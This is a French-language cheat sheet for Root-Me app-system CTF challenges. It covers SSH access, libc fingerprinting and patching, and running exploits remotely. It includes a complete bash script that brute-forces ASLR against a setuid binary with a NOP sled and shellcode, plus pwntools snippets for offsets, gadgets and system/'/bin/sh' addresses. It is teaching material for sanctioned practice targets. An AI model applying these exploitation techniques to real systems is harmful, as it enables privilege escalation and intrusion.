# Root-Me App-System — Workflow SSH et Environnement Remote

## Connexion aux challenges Root-Me

```bash
# Format de connexion Root-Me app-system
ssh -p 2222 app-systeme-ch0@challenge01.root-me.org
# Le mot de passe est souvent "app-systeme-ch0" (même que le user)

# Ou avec clé SSH (profil Root-Me → SSH Keys)
ssh -i ~/.ssh/rootme_key -p 2222 app-systeme-ch12@challenge01.root-me.org

# Challenges récents : port peut varier
ssh -p 2223 user@ctf.root-me.org
```

## Identifier la libc du serveur

```bash
# Méthode 1 : directement sur le serveur
ldd ./challenge
# → libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x...)
strings /lib/x86_64-linux-gnu/libc.so.6 | grep "GNU C Library"
# → GNU C Library (Ubuntu GLIBC 2.31-13ubuntu11) stable release version 2.31

# Méthode 2 : libc-database (local, après avoir les offsets)
# https://libc.blukat.me/ ou https://libc.rip/
# Donner : puts offset, system offset → identifie la libc

# Méthode 3 : télécharger la libc du serveur
scp -P 2222 user@host:/lib/x86_64-linux-gnu/libc.so.6 ./remote_libc.so.6
scp -P 2222 user@host:/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2 ./remote_ld.so.2

# Méthode 4 : printf dans le binaire pour leaker
python3 -c "
from pwn import *
# Leak adresse puts@got, calculer offset dans libc
# puts_offset = libc.symbols['puts']
# libc_base = puts_leak - puts_offset
# system = libc_base + libc.symbols['system']
"
```

## Patcher le binaire local pour matcher la libc remote

```bash
# patchelf : forcer le binaire à utiliser une libc spécifique localement
patchelf --set-interpreter ./remote_ld.so.2 ./challenge
patchelf --replace-needed libc.so.6 ./remote_libc.so.6 ./challenge

# Vérifier
ldd ./challenge
# → libc.so.6 => ./remote_libc.so.6

# Avec LD_PRELOAD (alternative sans modifier le binaire)
LD_PRELOAD=./remote_libc.so.6 ./challenge
```

## Transférer et exécuter un exploit via SSH

```bash
# Méthode 1 : scp + exécution
scp -P 2222 exploit.py user@host:~/
ssh -p 2222 user@host "python3 ~/exploit.py"

# Méthode 2 : stdin pipe (pour exploits simples)
python3 -c "import sys; sys.stdout.buffer.write(b'A'*100 + b'\xef\xbe\xad\xde')" \
  | ssh -p 2222 user@host "./challenge"

# Méthode 3 : pwntools SSH (recommandé pour interactif)
from pwn import *
shell = ssh('app-systeme-ch12', 'challenge01.root-me.org', port=2222, 
            password='app-systeme-ch12')
io = shell.process('./challenge')
# ... exploit ...
io.interactive()

# Méthode 4 : heredoc pour transférer code inline
ssh -p 2222 user@host 'cat > /tmp/exploit.py << '"'"'EOF'"'"'
from pwn import *
io = process("./challenge")
io.sendline(b"A"*100)
print(io.recvall())
EOF
python3 /tmp/exploit.py'
```

## Résoudre les contraintes remote (pas de pwntools installé)

```bash
# Vérifier les outils disponibles sur le serveur
which python3 python perl ruby nc socat

# Si pwntools absent : exploit en C compilé localement, transféré
# Compiler un exploit C statiquement
gcc -static -o exploit exploit.c
scp -P 2222 exploit user@host:~/tmp/
ssh -p 2222 user@host "./tmp/exploit"

# Exploit bash minimaliste
python3 -c "print('A'*72 + '\xef\xbe\xad\xde')" | ./challenge

# Exploit avec /proc/self/maps pour ASLR leak (si /proc accessible)
cat /proc/self/maps
```

## Contraintes mémoire serveur Root-Me (CRITIQUE)

**Symptôme** : `python3 exploit.py` échoue avec `MemoryError` ou `Killed` dès l'import de modules.

**Cause** : Les serveurs Root-Me sont des environnements multi-utilisateur contraints en RAM. Même `python3 -S` peut OOM car importer `subprocess` charge `threading → traceback → tokenize → collections`, chain très lourde.

**Règle** : Ne jamais importer de module complexe dans un script Python lancé sur le serveur. Préférer bash+awk.

```bash
# BAD : échoue sur le serveur même avec -S
python3 -S -c "import subprocess; subprocess.run(['./challenge'])"

# GOOD : bash+awk = empreinte mémoire minimale
awk 'BEGIN{ for(i=0;i<100;i++) print -1869574000; print i }' > /tmp/input.txt
./challenge /tmp/input.txt

# Génération rapide de fichier exploit avec awk
awk -v n="$NOP_VAL" -v sc="$SC_CHUNKS" 'BEGIN{
    for(i=1;i<996;i++){print n; print i}       # NOP sled
    nsc=split(sc,a," ")
    for(j=1;j<=nsc;j++){print a[j]; print 995+j}  # shellcode
}' > /tmp/exploit_base.txt
```

## Pilotage SSH depuis local avec paramiko (quand Python OOM sur le serveur)

**Architecture** : Python+paramiko tourne en **local**, le serveur n'exécute que des commandes bash légères.

```python
import paramiko, time

ssh = paramiko.SSHClient()
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
ssh.connect('challenge03.root-me.org', port=2223, username='app-systeme-ch21',
            password='app-systeme-ch21', timeout=30)
ssh.get_transport().set_keepalive(20)  # évite timeout inactif

# Uploader le script bash exploit
sftp = ssh.open_sftp()
sftp.put('/tmp/exploit.sh', '/tmp/exploit.sh')
sftp.chmod('/tmp/exploit.sh', 0o755)
sftp.close()

# UN SEUL exec_command pour tout le scan (voir limite canaux ci-dessous)
chan = ssh.get_transport().open_session()
chan.exec_command('bash /tmp/exploit.sh 2>&1')

# Streamer la sortie
while True:
    if chan.recv_ready():
        print(chan.recv(4096).decode('utf-8', errors='replace'), end='', flush=True)
    if chan.exit_status_ready():
        # Vider le buffer restant
        while chan.recv_ready():
            print(chan.recv(4096).decode('utf-8', errors='replace'), end='', flush=True)
        break
    time.sleep(0.1)
```

**Limite critique : canaux SSH par session**. Les serveurs Root-Me ferment la session après ~50 `exec_command`. Ne jamais boucler `exec_command` en Python — le canal se ferme avec "Channel closed".

```python
# BAD : channel closed après ~50 itérations
for addr in range(0xFFFFF000, 0xFF000000, -3840):
    chan = ssh.get_transport().open_session()  # échoue vite
    chan.exec_command(f'./challenge /tmp/input_{addr}.txt')

# GOOD : UNE exec_command lance un script bash qui boucle en interne
chan.exec_command('bash /tmp/scan_loop.sh 2>&1')
# Le bash loop tourne pendant des heures sans ouvrir de nouveaux canaux
```

## Variable SSH_CLIENT et impact sur le stack layout

**Observation** : La variable d'environnement `SSH_CLIENT` est définie par connexion TCP. Elle contient `"IP PORT 22"` et occupe de l'espace sur la pile. Changer la connexion SSH change l'adresse du buffer en 32-bit.

**Implication** : Si le scan est fait dans une connexion paramiko et l'exploit dans une autre, les adresses peuvent différer même si ASLR était fixe.

**Règle** : Toujours garder le MÊME objet `ssh` (même session TCP) entre le scan et l'exploit. Encore mieux : utiliser le shellcode combiné (voir elf-x86.md) qui scanne et exploite dans le même sous-processus.

```python
# Même connexion SSH pour toute la durée de l'exploit
ssh = paramiko.SSHClient()
ssh.connect(...)
ssh.get_transport().set_keepalive(20)

# Ne pas fermer/rouvrir la connexion entre le scan et l'exploit
# car SSH_CLIENT change → stack layout change → adresses différentes
```

## Script bash de scan ASLR optimal (serveur Root-Me 32-bit)

Template complet pour une boucle de brute-force ASLR robuste sur le serveur :

```bash
#!/bin/bash
B='/challenge/app-systeme/chXX/chXX'  # binaire setuid
N=-1869574000  # valeur NOP (0x90909090 signé 32-bit)
SC_CHUNKS='...'  # chunks int32 du shellcode (séparés par espaces)

# Construire le fichier de base une seule fois
awk -v n="$N" -v sc="$SC_CHUNKS" 'BEGIN{
    for(i=1;i<996;i++){print n; print i}         # sled 4000 octets
    nsc=split(sc,a," ")
    for(j=1;j<=nsc;j++){
        if(a[j]+0!=0){print a[j]; print 995+j}   # ignorer chunks=0
    }
}' > /tmp/base.txt

cnt=0; addr=4294963200  # 0xFFFFF000, scan vers le bas

while [ $cnt -lt 20000 ]; do
    # Conversion en signé 32-bit pour bash arithmetic
    if [ $addr -gt 2147483647 ]; then rd=$((addr-4294967296)); else rd=$addr; fi

    # Ajouter le vecteur de redirection (index -15 = retour de insert)
    { cat /tmp/base.txt; printf '%d\n-15\n' $rd; } > /tmp/exploit.txt

    timeout 2 setarch i386 -R "$B" /tmp/exploit.txt > /tmp/out.bin 2>/dev/null
    cnt=$((cnt+1))
    sz=$(wc -c < /tmp/out.bin 2>/dev/null | tr -d ' '); sz=${sz:-0}

    if [ "$sz" -gt 4 ]; then
        printf '[FLAG! cnt=%d addr=0x%08x sz=%d]\n' $cnt $addr $sz
        dd if=/tmp/out.bin bs=1 skip=4 count=$((sz-4)) 2>/dev/null
        printf '\n'; exit 0
    elif [ "$sz" -eq 4 ]; then
        printf '[EXEC-ONLY cnt=%d addr=0x%08x]\n' $cnt $addr  # shellcode tourne mais pas de flag
    fi

    addr=$((addr - 3840))
    [ $addr -lt 4278190080 ] && addr=4294963200  # wrap 0xFF000000 → 0xFFFFF000

    [ $((cnt % 100)) -eq 0 ] && printf '[scan] cnt=%d addr=0x%08x\n' $cnt $addr >&2
done
printf '[FAILED after %d tries]\n' $cnt
```

**Interprétation des tailles de sortie** :
- `sz=0` → SIGSEGV : redirection rate la NOP sled (continuer le scan)
- `sz=4` → Shellcode exécuté (ESP écrit), mais sys_open/sys_read/sys_write échoue (vérifier permissions setuid, chemin du fichier)
- `sz>4` → Succès : 4B ESP + contenu du flag

## Environnement serveur typique Root-Me

```bash
# Ce qui est généralement disponible
python3          # pwntools souvent absent
gcc              # pour compiler des exploits C
gdb              # parfois disponible, souvent absent
strings, file    # binutils
ltrace, strace   # parfois
nc, socat        # réseau

# Binaire challenge souvent dans :
~/                          # home directory
/challenge/                 # dossier dédié
/levels/<nom>/              # ancienne structure

# Flag généralement dans :
/challenge/.passwd
~/.passwd
/passwd
```

## Fingerprinter la libc avec des leaks

```python
from pwn import *

# Après avoir leaké une adresse libc (ex: puts@got)
puts_leak = 0x7f1234567890

# Méthode 1 : libc-database locale
# git clone https://github.com/niklasb/libc-database
# ./add /path/to/libc.so.6
# ./find puts 0x890  (3 derniers hex de l'offset)

# Méthode 2 : libc.rip API
import requests
r = requests.post('https://libc.rip/api/find', json={
    'symbols': {'puts': hex(puts_leak & 0xfff)}
})
print(r.json())

# Méthode 3 : pwntools DynELF (si read primitive disponible)
def leak(addr):
    # ... exploit pour lire addr ...
    return data
d = DynELF(leak, elf=elf)
system_addr = d.lookup('system', 'libc')
```

## Debugging local sans GDB interactif

```bash
# Trouver offset avec pattern cyclic
python3 -c "from pwn import *; print(cyclic(200).decode())" | ./challenge
# Après segfault : dmesg | tail ou /var/log/syslog pour voir l'adresse de crash
dmesg | tail -5
# → challenge[1234]: segfault at 6161616e ip 6161616e sp ...
python3 -c "from pwn import *; print(cyclic_find(0x6161616e))"

# GDB one-shot (sans pwntools gdb.attach)
echo "r <<< $(python3 -c "from pwn import *; sys.stdout.buffer.write(cyclic(200))")" | \
  gdb -q ./challenge
# Dans gdb : info registers, x/20x $rsp

# Valgrind pour UAF/heap bugs
valgrind --track-origins=yes ./challenge <<< "$(python3 -c "print('A'*100)")"

# ASAN build local pour confirmer vuln
gcc -fsanitize=address -o challenge_asan challenge.c
```

## One_gadget : trouver des gadgets shell directs

```bash
# Lister les gadgets one_shot dans la libc
one_gadget ./libc.so.6
# → Offsets avec conditions (rax==null, [rsp+0x30]==null, etc.)

# Avec la libc remote
one_gadget ./remote_libc.so.6

# En Python
from subprocess import check_output
gadgets = check_output(['one_gadget', '--raw', 'libc.so.6']).split()
# gadgets = [int(x, 16) for x in gadgets]
```

## Offsets utiles à connaître

```python
# Calculer l'offset d'un symbole dans libc
from pwn import *
libc = ELF('./libc.so.6')
print(hex(libc.symbols['system']))     # offset de system
print(hex(libc.symbols['__libc_start_main']))
print(next(libc.search(b'/bin/sh')))   # offset de /bin/sh

# Après leak d'une adresse libc connue :
libc_base = leaked_addr - libc.symbols['puts']
system = libc_base + libc.symbols['system']
binsh = libc_base + next(libc.search(b'/bin/sh'))
```
